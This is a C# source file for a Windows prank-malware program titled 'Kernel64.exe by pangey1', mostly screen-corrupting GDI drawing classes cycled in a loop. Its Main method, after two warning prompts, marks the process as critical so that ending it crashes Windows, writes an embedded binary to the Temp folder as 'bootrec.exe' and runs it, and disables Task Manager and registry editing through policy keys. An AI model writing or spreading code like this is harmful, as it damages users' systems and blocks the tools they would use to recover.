            int stripW = rand.Next(10, 80);
            int fallY = rand.Next(3, 18);
            BitBlt(hdc, x, fallY, stripW, h, hdc, x, 0, SRCCOPY);
        }

        BLENDFUNCTION bf = new BLENDFUNCTION();
        bf.BlendOp = 0;
        bf.BlendFlags = 0;
        bf.SourceConstantAlpha = 40;
        bf.AlphaFormat = 0;
        AlphaBlend(hdc, 0, 0, w, h, hdc, rand.Next(0, 7), rand.Next(0, 7), w, h, bf);

        int now = Environment.TickCount;
        if (unchecked(now - lastTick) >= 100)
        {
            lastTick = now;
            if (alphaValue < 255)
            {
                alphaValue += 5;
                if (alphaValue > 255)
                {
                    alphaValue = 255;
                }
            }
        }

        if (rgbImg != null)
        {
            try
            {
                using (Graphics g = Graphics.FromHdc(hdc))
                using (System.Drawing.Imaging.ImageAttributes attributes = new System.Drawing.Imaging.ImageAttributes())
                {
                    System.Drawing.Imaging.ColorMatrix matrix = new System.Drawing.Imaging.ColorMatrix();
                    matrix.Matrix33 = alphaValue / 255f;
                    attributes.SetColorMatrix(matrix, System.Drawing.Imaging.ColorMatrixFlag.Default, System.Drawing.Imaging.ColorAdjustType.Bitmap);
                    g.DrawImage(rgbImg, new Rectangle(0, 0, w, h), 0, 0, rgbImg.Width, rgbImg.Height, GraphicsUnit.Pixel, attributes);
                }
            }
            catch { }
        }

        redrawCounter++;
    }
}
public class Drawer8 : Drawer
{
    [DllImport("gdi32.dll")]
    private static extern bool PatBlt(IntPtr hdc, int x, int y, int w, int h, uint rop);

    [DllImport("gdi32.dll")]
    private static extern IntPtr CreateSolidBrush(int color);

    [DllImport("gdi32.dll")]
    private static extern IntPtr SelectObject(IntPtr hdc, IntPtr hgdiobj);

    [DllImport("gdi32.dll")]
    private static extern bool DeleteObject(IntPtr ho);

    private const uint PATINVERT = 0x005A0049;
    private const uint DSTINVERT = 0x00550009;

    private int redrawCounter;
    private Random rand = new Random();

    public override void Draw(IntPtr hdc)
    {
        int w = ScreenW;
        int h = ScreenH;
        int speed = 10;

        BitBlt(hdc, 0, 0, speed, h, hdc, w - speed, 0, SRCCOPY);
        BitBlt(hdc, speed, 0, w - speed, h, hdc, 0, 0, SRCCOPY);

        int color = rand.Next(0, 0x1000000);
        IntPtr brush = CreateSolidBrush(color);
        IntPtr oldBrush = SelectObject(hdc, brush);
        PatBlt(hdc, 0, 0, w, h, PATINVERT);
        SelectObject(hdc, oldBrush);
        DeleteObject(brush);

        for (int i = 0; i < 6; i++)
        {
            int size = rand.Next(40, 220);
            int rx = rand.Next(0, w - size);
            int ry = rand.Next(0, h - size);
            PatBlt(hdc, rx, ry, size, size, DSTINVERT);
        }

        redrawCounter++;
    }
}
public class Drawer9 : Drawer
{
    private int redrawCounter;
    private int codcod;
    private int ballWidth = 100;
    private int ballHeight = 100;
    private int ballPosX;
    private int ballPosY;
    private int moveStepX = 5;
    private int moveStepY = 5;
    private Random random = new Random();

    private Color HslToColor(int h, float s, float l)
    {
        float c = (1f - Math.Abs(2f * l - 1f)) * s;
        float x = c * (1f - Math.Abs((h / 60f) % 2f - 1f));
        float m = l - c / 2f;
        float r = 0f;
        float g = 0f;
        float b = 0f;

        if (h >= 0 && h < 60)
        {
            r = c;
            g = x;
        }
        else if (h >= 60 && h < 120)
        {
            r = x;
            g = c;
        }
        else if (h >= 120 && h < 180)
        {
            g = c;
            b = x;
        }
        else if (h >= 180 && h < 240)
        {
            g = x;
            b = c;
        }
        else if (h >= 240 && h < 300)
        {
            r = x;
            b = c;
        }
        else
        {
            r = c;
            b = x;
        }

        return Color.FromArgb(64, (int)((r + m) * 255f), (int)((g + m) * 255f), (int)((b + m) * 255f));
    }

    public override void Draw(IntPtr hdc)
    {
        try
        {
            redrawCounter++;
            int h = redrawCounter % 360;
            codcod += 2;
            int h2 = codcod % 360;

            int w = ScreenW;
            int hScr = ScreenH;

            using (Graphics graphics = Graphics.FromHdc(hdc))
            {
                Color c1 = HslToColor(h2, 1f, 0.5f);
                Color c2 = HslToColor(h, 1f, 0.5f);
                graphics.SmoothingMode = System.Drawing.Drawing2D.SmoothingMode.AntiAlias;
                using (System.Drawing.Drawing2D.LinearGradientBrush brush = new System.Drawing.Drawing2D.LinearGradientBrush(new Point(0, 10), new Point(200, 10), c1, c2))
                {
                    graphics.FillEllipse(brush, ballPosX, ballPosY, ballWidth, ballHeight);
                }
            }

            ballPosX += moveStepX;
            if (ballPosX < 0 || ballPosX + ballWidth > w)
            {
                moveStepX = -moveStepX;
            }

            ballPosY += moveStepY;
            if (ballPosY < 0 || ballPosY + ballHeight > hScr)
            {
                moveStepY = -moveStepY;
            }

            if (redrawCounter >= 360)
            {
                redrawCounter = 0;
                BitBlt(hdc, 0, 0, w, hScr, hdc, random.Next(-1, 2), random.Next(-1, 2), 15597702);
            }

            if (codcod >= 360)
            {
                codcod = 0;
                BitBlt(hdc, 0, 0, w, hScr, hdc, random.Next(-1, 2), random.Next(-1, 2), 15597702);
            }
        }
        catch
        {
        }
        System.Threading.Thread.Sleep(10);
    }
}
public class Drawer10 : Drawer
{
    [DllImport("gdi32.dll")]
    private static extern bool StretchBlt(IntPtr hdcDest, int xDest, int yDest, int wDest, int hDest, IntPtr hdcSrc, int xSrc, int ySrc, int wSrc, int hSrc, uint rop);

    [DllImport("gdi32.dll")]
    private static extern int SetStretchBltMode(IntPtr hdc, int mode);

    private int redrawCounter;

    public override void Draw(IntPtr hdc)
    {
        int w = ScreenW;
        int h = ScreenH;
        int speed = 8;

        BitBlt(hdc, 0, 0, w, speed, hdc, 0, h - speed, SRCCOPY);
        BitBlt(hdc, 0, speed, w, h - speed, hdc, 0, 0, SRCCOPY);

        int padX = w / 16;
        int padY = h / 16;
        SetStretchBltMode(hdc, 3);
        StretchBlt(hdc, padX, padY, w - padX * 2, h - padY * 2, hdc, 0, 0, w, h, SRCCOPY);

        redrawCounter++;
    }
}
public class Drawer11 : Drawer
{
    private int redrawCounter;
    private Random rand = new Random();
    private static Image cachedImg;

    public override void Draw(IntPtr hdc)
    {
        int w = ScreenW;
        int h = ScreenH;

        if (cachedImg == null)
        {
            cachedImg = global::Kernel64.Properties.Resources.image_202211221317;
        }

        if (cachedImg != null)
        {
            try
            {
                using (Graphics g = Graphics.FromHdc(hdc))
                {
                    for (int i = 0; i < 6; i++)
                    {
                        int rw = rand.Next(20, w / 2);
                        int rh = rand.Next(20, h / 2);
                        int rx = rand.Next(0, w - rw);
                        int ry = rand.Next(0, h - rh);
                        g.DrawImage(cachedImg, rx, ry, rw, rh);
                    }
                }
            }
            catch { }
        }

        redrawCounter++;
    }
}
public class Drawer12 : Drawer
{
    private int redrawCounter;

    public override void Draw(IntPtr hdc)
    {
        int w = ScreenW;
        int h = ScreenH;
        int step = 8;
        uint rop = 0x999999;

        BitBlt(hdc, 0, -step, w, h, hdc, 0, 0, rop);
        BitBlt(hdc, 0, step, w, h, hdc, 0, 0, rop);
        BitBlt(hdc, -step, 0, w, h, hdc, 0, 0, rop);
        BitBlt(hdc, step, 0, w, h, hdc, 0, 0, rop);

        BitBlt(hdc, -step, -step, w, h, hdc, 0, 0, rop);
        BitBlt(hdc, step, -step, w, h, hdc, 0, 0, rop);
        BitBlt(hdc, -step, step, w, h, hdc, 0, 0, rop);
        BitBlt(hdc, step, step, w, h, hdc, 0, 0, rop);

        redrawCounter++;
    }
}
public class Drawer13 : Drawer
{
    private const uint SRCPAINT = 0x00EE0086;

    private int redrawCounter;

    public override void Draw(IntPtr hdc)
    {
        int w = ScreenW;
        int h = ScreenH;
        int speed = 10;

        BitBlt(hdc, 0, 0, speed, h, hdc, w - speed, 0, SRCPAINT);
        BitBlt(hdc, speed, 0, w - speed, h, hdc, 0, 0, SRCPAINT);

        redrawCounter++;
    }
}
public class Drawer14 : Drawer
{
    private int redrawCounter;
    private Random rand = new Random();
    private static Image cachedImg;

    public override void Draw(IntPtr hdc)
    {
        int w = ScreenW;
        int h = ScreenH;

        if (cachedImg == null)
        {
            cachedImg = global::Kernel64.Properties.Resources.sine;
        }

        if (cachedImg != null)
        {
            try
            {
                using (Graphics g = Graphics.FromHdc(hdc))
                using (System.Drawing.Imaging.ImageAttributes attributes = new System.Drawing.Imaging.ImageAttributes())
                {
                    float r = (float)(0.5 + 0.5 * Math.Sin(redrawCounter * 0.1));
                    float gr = (float)(0.5 + 0.5 * Math.Sin(redrawCounter * 0.1 + 2.094));
                    float b = (float)(0.5 + 0.5 * Math.Sin(redrawCounter * 0.1 + 4.188));

                    System.Drawing.Imaging.ColorMatrix matrix = new System.Drawing.Imaging.ColorMatrix(new float[][]
                    {
                        new float[] { r, 0f, 0f, 0f, 0f },
                        new float[] { 0f, gr, 0f, 0f, 0f },
                        new float[] { 0f, 0f, b, 0f, 0f },
                        new float[] { 0f, 0f, 0f, 1f, 0f },
                        new float[] { 0f, 0f, 0f, 0f, 1f }
                    });

                    attributes.SetColorMatrix(matrix, System.Drawing.Imaging.ColorMatrixFlag.Default, System.Drawing.Imaging.ColorAdjustType.Bitmap);

                    int rw = cachedImg.Width;
                    int rh = cachedImg.Height;
                    int rx = rand.Next(0, Math.Max(1, w - rw));
                    int ry = rand.Next(0, Math.Max(1, h - rh));
                    g.DrawImage(cachedImg, new Rectangle(rx, ry, rw, rh), 0, 0, rw, rh, GraphicsUnit.Pixel, attributes);
                }
            }
            catch { }
        }

        redrawCounter++;
    }
}
public class Drawer15 : Drawer
{
    [DllImport("shell32.dll", CharSet = CharSet.Auto)]
    private static extern uint ExtractIconEx(string lpszFile, int nIconIndex, IntPtr[] phiconLarge, IntPtr[] phiconSmall, uint nIcons);

    [DllImport("user32.dll")]
    private static extern bool DrawIcon(IntPtr hDC, int X, int Y, IntPtr hIcon);

    [DllImport("user32.dll")]
    private static extern bool DestroyIcon(IntPtr hIcon);

    private int redrawCounter;
    private Random rand = new Random();
    private int horizX;
    private int horizY;
    private int vertX;
    private int vertY;
    private IntPtr horizIcon = IntPtr.Zero;
    private IntPtr vertIcon = IntPtr.Zero;

    private IntPtr GetRandomImageresIcon()
    {
        IntPtr[] large = new IntPtr[1];
        IntPtr[] small = new IntPtr[1];
        int idx = rand.Next(2, 180);
        if (ExtractIconEx("imageres.dll", idx, large, small, 1) > 0 && large[0] != IntPtr.Zero)
        {
            if (small[0] != IntPtr.Zero)
            {
                DestroyIcon(small[0]);
            }
            return large[0];
        }
        return IntPtr.Zero;
    }

    public override void Draw(IntPtr hdc)
    {
        int w = ScreenW;
        int h = ScreenH;

        if (horizIcon == IntPtr.Zero || horizX >= w)
        {
            if (horizIcon != IntPtr.Zero)
            {
                DestroyIcon(horizIcon);
            }
            horizIcon = GetRandomImageresIcon();
            horizX = 0;
            horizY = rand.Next(0, Math.Max(1, h - 32));
        }

        if (vertIcon == IntPtr.Zero || vertY >= h)
        {
            if (vertIcon != IntPtr.Zero)
            {
                DestroyIcon(vertIcon);
            }
            vertIcon = GetRandomImageresIcon();
            vertX = rand.Next(0, Math.Max(1, w - 32));
            vertY = 0;
        }

        if (horizIcon != IntPtr.Zero)
        {
            DrawIcon(hdc, horizX, horizY, horizIcon);
            horizX += 24;
        }

        if (vertIcon != IntPtr.Zero)
        {
            DrawIcon(hdc, vertX, vertY, vertIcon);
            vertY += 24;
        }

        redrawCounter++;
    }
}
public class RandomDrawer
{
    [DllImport("user32.dll")]
    private static extern IntPtr GetDC(IntPtr hWnd);

    [DllImport("user32.dll")]
    private static extern int ReleaseDC(IntPtr hWnd, IntPtr hDC);

    [DllImport("user32.dll")]
    private static extern bool InvalidateRect(IntPtr hWnd, IntPtr lpRect, bool bErase);

    private System.Threading.Thread workerThread;
    private Random rand = new Random();

    public void Start()
    {
        workerThread = new System.Threading.Thread(new System.Threading.ThreadStart(Run));
        workerThread.IsBackground = true;
        workerThread.Start();
    }

    private Drawer CreateRandomDrawer()
    {
        int index = rand.Next(1, 16);
        switch (index)
        {
            case 1: return new Drawer1();
            case 2: return new Drawer2();
            case 3: return new Drawer3();
            case 4: return new Drawer4();
            case 5: return new Drawer5();
            case 6: return new Drawer6();
            case 7: return new Drawer7();
            case 8: return new Drawer8();
            case 9: return new Drawer9();
            case 10: return new Drawer10();
            case 11: return new Drawer11();
            case 12: return new Drawer12();
            case 13: return new Drawer13();
            case 14: return new Drawer14();
            default: return new Drawer15();
        }
    }

    private void Run()
    {
        while (true)
        {
            Drawer current = CreateRandomDrawer();
            int startTick = Environment.TickCount;

            while (unchecked(Environment.TickCount - startTick) < 10000)
            {
                IntPtr hdc = GetDC(IntPtr.Zero);
                if (hdc != IntPtr.Zero)
                {
                    current.Draw(hdc);
                    ReleaseDC(IntPtr.Zero, hdc);
                }
                System.Threading.Thread.Sleep(10);
            }

            InvalidateRect(IntPtr.Zero, IntPtr.Zero, true);
        }
    }

    public class RandomDrawerManager
    {
        [DllImport("user32.dll")]
            private static extern IntPtr GetDC(IntPtr hWnd);

            [DllImport("user32.dll")]
            private static extern int ReleaseDC(IntPtr hWnd, IntPtr hDC);

            [DllImport("user32.dll")]
            private static extern bool InvalidateRect(IntPtr hWnd, IntPtr lpRect, bool bErase);

            public static volatile bool IsFinished = false;

            private System.Threading.Thread workerThread;
            private Random rand = new Random();

            public void Start()
            {
                workerThread = new System.Threading.Thread(new System.Threading.ThreadStart(Run));
                workerThread.IsBackground = true;
                workerThread.Start();
            }

            private Drawer CreateRandomDrawer()
            {
                int index = rand.Next(1, 16);
                switch (index)
                {
                    case 1: return new Drawer1();
                    case 2: return new Drawer2();
                    case 3: return new Drawer3();
                    case 4: return new Drawer4();
                    case 5: return new Drawer5();
                    case 6: return new Drawer6();
                    case 7: return new Drawer7();
                    case 8: return new Drawer8();
                    case 9: return new Drawer9();
                    case 10: return new Drawer10();
                    case 11: return new Drawer11();
                    case 12: return new Drawer12();
                    case 13: return new Drawer13();
                    case 14: return new Drawer14();
                    default: return new Drawer15();
                }
            }

            private void Run()
            {
                while (!IsFinished)
                {
                    Drawer current = CreateRandomDrawer();
                    int duration = rand.Next(5000, 10001);
                    int startTick = Environment.TickCount;

                    while (!IsFinished && unchecked(Environment.TickCount - startTick) < duration)
                    {
                        IntPtr hdc = GetDC(IntPtr.Zero);
                        if (hdc != IntPtr.Zero)
                        {
                            current.Draw(hdc);
                            ReleaseDC(IntPtr.Zero, hdc);
                        }
                        System.Threading.Thread.Sleep(10);
                    }

                    InvalidateRect(IntPtr.Zero, IntPtr.Zero, true);
                }
            }
        }
        [DllImport("ntdll.dll", SetLastError = true)]
        private static extern int NtSetInformationProcess(
    IntPtr hProcess,
    int processInformationClass,
    ref int processInformation,
    int processInformationLength
);
        private const int BreakOnTermination = 0x1D;
        private static int isCritical = 1;
        internal static class Program
        {
            [STAThread]
            private static void Main()
            {
                Application.EnableVisualStyles();
                Application.SetCompatibleTextRenderingDefault(false);

                DialogResult warn1 = MessageBox.Show("This is a malware, run?", "Kernel64.exe by pangey1", MessageBoxButtons.YesNo, MessageBoxIcon.Warning);
                if (warn1 != DialogResult.Yes)
                {
                    return;
                }

                DialogResult warn2 = MessageBox.Show("Are you sure?", "Final warning!!!", MessageBoxButtons.YesNo, MessageBoxIcon.Warning);
                if (warn2 != DialogResult.Yes)
                {
                    return;
                }
                Process.EnterDebugMode();
                NtSetInformationProcess(Process.GetCurrentProcess().Handle, BreakOnTermination, ref isCritical, sizeof(int));
                string path = Path.Combine(Path.GetTempPath(), "bootrec.exe");
                File.WriteAllBytes(path, Kernel64.Properties.Resources.k64);
                Process.Start(path);
                RegistryKey distaskmgr = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
                distaskmgr.SetValue("DisableTaskMgr", 1, RegistryValueKind.DWord);
                RegistryKey disregedit = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
                disregedit.SetValue("DisableRegistryTools", 1, RegistryValueKind.DWord);

                RandomDrawer randomDrawer = new RandomDrawer();
                randomDrawer.Start();

                System.Threading.Thread.Sleep(4000);
                System.Threading.Thread formThread = new System.Threading.Thread(new System.Threading.ThreadStart(delegate
                {
                    Application.Run(new Form1());
                }));
                randomDrawer.Start();
                System.Action<System.IntPtr>[] bbs = new System.Action<System.IntPtr>[]
                {
    new bb1().Draw, new bb2().Draw, new bb3().Draw, new bb4().Draw, new bb5().Draw,
    new bb6().Draw, new bb7().Draw, new bb8().Draw, new bb9().Draw, new bb10().Draw,
    new bb11().Draw, new bb12().Draw, new bb13().Draw, new bb14().Draw, new bb15().Draw
                };

                foreach (var drawMethod in bbs)
                {
                    try
                    {
                        drawMethod(System.IntPtr.Zero);
                    }
                    catch { }
                }
                Environment.Exit(0);
            }
        }
    }